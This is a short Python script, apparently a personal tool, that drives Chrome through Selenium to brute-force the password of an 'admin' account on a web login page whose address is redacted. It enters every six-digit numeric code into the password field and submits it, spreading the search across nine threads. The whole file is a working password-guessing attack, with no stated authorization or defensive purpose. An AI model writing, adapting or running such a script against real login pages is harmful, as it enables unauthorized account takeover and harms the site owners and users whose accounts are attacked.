from selenium import webdriver
import _thread

def crack(l, r):
    driver = webdriver.Chrome("xxxx\chromedriver.exe")
    driver.get('http://xxxx/login?url=%2F')
    userid = driver.find_element_by_id('username')
    userid.send_keys("admin")
    userpass = driver.find_element_by_id('password')
    element_search_button = driver.find_element_by_id('login')
    for i in range(l,r):
        i = str(i)
        userpass.send_keys(i.zfill(6))
        element_search_button.click()
        userpass.clear()
    driver.close()

def solve(l, r):
    for i in range(l, r):
        crack((i - 1) * 1000 + 1, i * 1000)

try:
    _thread.start_new_thread (solve, (121, 200))
    _thread.start_new_thread (solve, (201, 300))
    _thread.start_new_thread (solve, (301, 400))
    _thread.start_new_thread (solve, (401, 500))
    _thread.start_new_thread (solve, (501, 600))
    _thread.start_new_thread (solve, (601, 700))
    _thread.start_new_thread (solve, (701, 800))
    _thread.start_new_thread (solve, (801, 900))
    _thread.start_new_thread (solve, (901, 1000))
except:
    print("Error")

while 1:
    pass
